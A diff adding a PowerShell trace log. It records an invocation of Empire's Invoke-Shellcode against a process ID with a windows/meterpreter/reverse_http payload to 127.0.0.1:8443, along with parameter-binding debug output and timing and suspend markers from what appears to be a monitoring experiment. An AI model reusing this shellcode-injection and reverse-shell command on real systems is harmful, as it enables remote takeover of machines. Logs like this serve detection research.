@@ -1,0 +1,198 @@
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\WINDOWS\system32> Trace-Command -Name metadata, parameterbinding, cmdlet -Expression {. "C:\Users\puma-4\Downloads\Empire-master\Empire-master\data\module_source\code_execution\Invoke-Shellcode.ps1";Invoke-Shellcode -ProcessId "7128";} -PSHost;
+DEBUG: ParameterBinding Information: 0 : BIND NAMED cmd line args [Invoke-Shellcode]
+DEBUG: ParameterBinding Information: 0 :     BIND arg [7128] to parameter [ProcessID]
+DEBUG: ParameterBinding Information: 0 :         Executing DATA GENERATION metadata: 
+[System.Management.Automation.ArgumentTypeConverterAttribute]
+DEBUG: ParameterBinding Information: 0 :             result returned from DATA GENERATION: 7128
+DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.UInt16]
+DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :         Executing VALIDATION metadata: 
+[System.Management.Automation.ValidateNotNullOrEmptyAttribute]
+DEBUG: ParameterBinding Information: 0 :         BIND arg [7128] to param [ProcessID] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 : BIND POSITIONAL cmd line args [Invoke-Shellcode]
+DEBUG: ParameterBinding Information: 0 : MANDATORY PARAMETER CHECK on cmdlet [Invoke-Shellcode]
+Time-Tracker 2023-07-18 01:38:46
+DEBUG: ParameterBinding Information: 0 :     BIND arg [] to parameter [Shellcode]
+DEBUG: ParameterBinding Information: 0 :         Executing DATA GENERATION metadata: 
+[System.Management.Automation.ArgumentTypeConverterAttribute]
+DEBUG: ParameterBinding Information: 0 :             result returned from DATA GENERATION: 
+DEBUG: ParameterBinding Information: 0 :         BIND arg [] to param [Shellcode] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :     BIND arg [windows/meterpreter/reverse_http] to parameter [Payload]
+DEBUG: ParameterBinding Information: 0 :         Executing DATA GENERATION metadata: 
+[System.Management.Automation.ArgumentTypeConverterAttribute]
+DEBUG: ParameterBinding Information: 0 :             result returned from DATA GENERATION: 
+windows/meterpreter/reverse_http
+DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.String]
+DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :         BIND arg [windows/meterpreter/reverse_http] to param [Payload] 
+SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :     BIND arg [False] to parameter [ListMetasploitPayloads]
+DEBUG: ParameterBinding Information: 0 :         Executing DATA GENERATION metadata: 
+[System.Management.Automation.ArgumentTypeConverterAttribute]
+DEBUG: ParameterBinding Information: 0 :             result returned from DATA GENERATION: False
+DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.Management.Automation.SwitchParameter]
+DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :         BIND arg [False] to param [ListMetasploitPayloads] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :     BIND arg [127.0.0.1] to parameter [Lhost]
+DEBUG: ParameterBinding Information: 0 :         Executing DATA GENERATION metadata: 
+[System.Management.Automation.ArgumentTypeConverterAttribute]
+DEBUG: ParameterBinding Information: 0 :             result returned from DATA GENERATION: 127.0.0.1
+DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.String]
+DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :         BIND arg [127.0.0.1] to param [Lhost] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :     BIND arg [8443] to parameter [Lport]
+DEBUG: ParameterBinding Information: 0 :         Executing DATA GENERATION metadata: 
+[System.Management.Automation.ArgumentTypeConverterAttribute]
+DEBUG: ParameterBinding Information: 0 :             result returned from DATA GENERATION: 8443
+DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.Int32]
+DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :         BIND arg [8443] to param [Lport] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :     BIND NAMED cmd line args [Import-Module]
+DEBUG: ParameterBinding Information: 0 :         BIND arg 
+[C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Management\Microsoft.PowerShell.Management.psd
+1] to parameter [Name]
+DEBUG: ParameterBinding Information: 0 :             COERCE arg to [System.String[]]
+DEBUG: ParameterBinding Information: 0 :                 Trying to convert argument value from System.String to 
+System.String[]
+DEBUG: ParameterBinding Information: 0 :                 ENCODING arg into collection
+DEBUG: ParameterBinding Information: 0 :                 Binding collection parameter Name: argument type [String], 
+parameter type [System.String[]], collection type Array, element type [System.String], coerceElementType
+DEBUG: ParameterBinding Information: 0 :                 Creating array with element type [System.String] and 1 
+elements
+DEBUG: ParameterBinding Information: 0 :                 Argument type String is not IList, treating this as scalar
+DEBUG: ParameterBinding Information: 0 :                 COERCE arg to [System.String]
+DEBUG: ParameterBinding Information: 0 :                     Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :                 Adding scalar element of type String to array position 0
+DEBUG: ParameterBinding Information: 0 :             Executing VALIDATION metadata: 
+[System.Management.Automation.ValidateTrustedDataAttribute]
+DEBUG: ParameterBinding Information: 0 :             BIND arg [System.String[]] to param [Name] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :         BIND arg [GLOBAL] to parameter [Scope]
+DEBUG: ParameterBinding Information: 0 :             COERCE arg to [System.String]
+DEBUG: ParameterBinding Information: 0 :                 Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :             Executing VALIDATION metadata: 
+[System.Management.Automation.ValidateSetAttribute]
+DEBUG: ParameterBinding Information: 0 :             BIND arg [GLOBAL] to param [Scope] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :         BIND arg [True] to parameter [PassThru]
+DEBUG: ParameterBinding Information: 0 :             COERCE arg to [System.Management.Automation.SwitchParameter]
+DEBUG: ParameterBinding Information: 0 :                 Trying to convert argument value from System.Boolean to 
+System.Management.Automation.SwitchParameter
+DEBUG: ParameterBinding Information: 0 :             BIND arg [True] to param [PassThru] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :         BIND arg [Ignore] to parameter [ErrorAction]
+DEBUG: ParameterBinding Information: 0 :             COERCE arg to [System.Management.Automation.ActionPreference]
+DEBUG: ParameterBinding Information: 0 :                 Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :             BIND arg [Ignore] to param [ErrorAction] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :         BIND arg [Ignore] to parameter [WarningAction]
+DEBUG: ParameterBinding Information: 0 :             COERCE arg to [System.Management.Automation.ActionPreference]
+DEBUG: ParameterBinding Information: 0 :                 Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :             BIND arg [Ignore] to param [WarningAction] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :         BIND arg [Ignore] to parameter [InformationAction]
+DEBUG: ParameterBinding Information: 0 :             COERCE arg to [System.Management.Automation.ActionPreference]
+DEBUG: ParameterBinding Information: 0 :                 Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :             BIND arg [Ignore] to param [InformationAction] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :         BIND arg [False] to parameter [Verbose]
+DEBUG: ParameterBinding Information: 0 :             COERCE arg to [System.Management.Automation.SwitchParameter]
+DEBUG: ParameterBinding Information: 0 :                 Trying to convert argument value from System.Boolean to 
+System.Management.Automation.SwitchParameter
+DEBUG: ParameterBinding Information: 0 :             BIND arg [False] to param [Verbose] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :         BIND arg [False] to parameter [Debug]
+DEBUG: ParameterBinding Information: 0 :             COERCE arg to [System.Management.Automation.SwitchParameter]
+DEBUG: ParameterBinding Information: 0 :                 Trying to convert argument value from System.Boolean to 
+System.Management.Automation.SwitchParameter
+DEBUG: ParameterBinding Information: 0 :             BIND arg [False] to param [Debug] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :     BIND POSITIONAL cmd line args [Import-Module]
+DEBUG: ParameterBinding Information: 0 :     MANDATORY PARAMETER CHECK on cmdlet [Import-Module]
+Time-Tracker 2023-07-18 01:38:48
+DEBUG: ParameterBinding Information: 0 :     CALLING BeginProcessing
+DEBUG: ParameterBinding Information: 0 :     CALLING EndProcessing
+DEBUG: ParameterBinding Information: 0 :     BIND NAMED cmd line args [Get-ItemProperty]
+DEBUG: ParameterBinding Information: 0 :         BIND arg [HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet 
+Settings] to parameter [Path]
+DEBUG: ParameterBinding Information: 0 :             COERCE arg to [System.String[]]
+DEBUG: ParameterBinding Information: 0 :                 Trying to convert argument value from System.String to 
+System.String[]
+DEBUG: ParameterBinding Information: 0 :                 ENCODING arg into collection
+DEBUG: ParameterBinding Information: 0 :                 Binding collection parameter Path: argument type [String], 
+parameter type [System.String[]], collection type Array, element type [System.String], coerceElementType
+DEBUG: ParameterBinding Information: 0 :                 Creating array with element type [System.String] and 1 
+elements
+DEBUG: ParameterBinding Information: 0 :                 Argument type String is not IList, treating this as scalar
+DEBUG: ParameterBinding Information: 0 :                 COERCE arg to [System.String]
+DEBUG: ParameterBinding Information: 0 :                     Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :                 Adding scalar element of type String to array position 0
+DEBUG: ParameterBinding Information: 0 :             BIND arg [System.String[]] to param [Path] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :     BIND POSITIONAL cmd line args [Get-ItemProperty]
+DEBUG: ParameterBinding Information: 0 :     BIND cmd line args to DYNAMIC parameters.
+DEBUG: ParameterBinding Information: 0 :     MANDATORY PARAMETER CHECK on cmdlet [Get-ItemProperty]
+Time-Tracker 2023-07-18 01:38:49
+DEBUG: ParameterBinding Information: 0 :     CALLING BeginProcessing
+DEBUG: ParameterBinding Information: 0 :     CALLING EndProcessing
+
+*SUSPENDED the spawned-powershell-process 2152 due to: 'DEBUG: ParameterBinding Information: 0 :     CALLING EndProcessing
+'
+
+Time-Tracker 2023-07-18 01:38:49
+sleep now : for 1 seconds
+Time-Tracker 2023-07-18 01:38:49
+wake up now : as 1 seconds past
+Time-Tracker 2023-07-18 01:38:50
+
+*RESUMED the spwaned-powershell-process 2152
+
+Time-Tracker 2023-07-18 01:38:50
+[UserAgent]
+DEBUG: ParameterBinding Information: 0 :         Executing DATA GENERATION metadata: 
+[System.Management.Automation.ArgumentTypeConverterAttribute]
+DEBUG: ParameterBinding Information: 0 :             result returned from DATA GENERATION: Mozilla/4.0 (compatible; 
+MSIE 8.0; Win32)
+DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.String]
+DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :         BIND arg [Mozilla/4.0 (compatible; MSIE 8.0; Win32)] to param 
+[UserAgent] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :     BIND arg [False] to parameter [Legacy]
+DEBUG: ParameterBinding Information: 0 :         Executing DATA GENERATION metadata: 
+[System.Management.Automation.ArgumentTypeConverterAttribute]
+DEBUG: ParameterBinding Information: 0 :             result returned from DATA GENERATION: False
+DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.Management.Automation.SwitchParameter]
+DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :         BIND arg [False] to param [Legacy] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :     BIND arg [False] to parameter [Proxy]
+DEBUG: ParameterBinding Information: 0 :         Executing DATA GENERATION metadata: 
+[System.Management.Automation.ArgumentTypeConverterAttribute]
+DEBUG: ParameterBinding Information: 0 :             result returned from DATA GENERATION: False
+DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.Management.Automation.SwitchParameter]
+DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :         BIND arg [False] to param [Proxy] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :     BIND arg [False] to parameter [Force]
+DEBUG: ParameterBinding Information: 0 :         Executing DATA GENERATION metadata: 
+[System.Management.Automation.ArgumentTypeConverterAttribute]
+DEBUG: ParameterBinding Information: 0 :             result returned from DATA GENERATION: False
+DEBUG: ParameterBinding Information: 0 :         COERCE arg to [System.Management.Automation.SwitchParameter]
+DEBUG: ParameterBinding Information: 0 :             Parameter and arg types the same, no coercion is needed.
+DEBUG: ParameterBinding Information: 0 :         BIND arg [False] to param [Force] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 : CALLING BeginProcessing
+DEBUG: ParameterBinding Information: 0 : CALLING EndProcessing
+DEBUG: ParameterBinding Information: 0 :     BIND NAMED cmd line args [Set-StrictMode]
+DEBUG: ParameterBinding Information: 0 :         BIND arg [2.0] to parameter [Version]
+DEBUG: ParameterBinding Information: 0 :             Executing DATA GENERATION metadata: 
+[Microsoft.PowerShell.Commands.SetStrictModeCommand+ArgumentToVersionTransformationAttribute]
+DEBUG: ParameterBinding Information: 0 :                 result returned from DATA GENERATION: 2.0
+DEBUG: ParameterBinding Information: 0 :             COERCE arg to [System.Version]
+DEBUG: ParameterBinding Information: 0 :                 Trying to convert argument value from 
+System.Management.Automation.PSObject to System.Version
+DEBUG: ParameterBinding Information: 0 :                 CONVERT arg type to param type using 
+LanguagePrimitives.ConvertTo
+DEBUG: ParameterBinding Information: 0 :                 CONVERT SUCCESSFUL using LanguagePrimitives.ConvertTo: [2.0]
+DEBUG: ParameterBinding Information: 0 :             Executing VALIDATION metadata: 
+[Microsoft.PowerShell.Commands.SetStrictModeCommand+ValidateVersionAttribute]
+DEBUG: ParameterBinding Information: 0 :             BIND arg [2.0] to param [Version] SUCCESSFUL
+DEBUG: ParameterBinding Information: 0 :     BIND POSITIONAL cmd line args [Set-StrictMode]
+DEBUG: ParameterBinding Information: 0 :     MANDATORY PARAMETER CHECK on cmdlet [Set-StrictMode]
+Time-Tracker 2023-07-18 01:38:51
+DEBUG: ParameterBinding Information: 0 :     CALLING BeginProcessing
+DEBUG: ParameterBinding Information: 0 :     CALLING EndProcessing
+spawned_psh_process -- Ended before 1 hr ; with NO exception raised
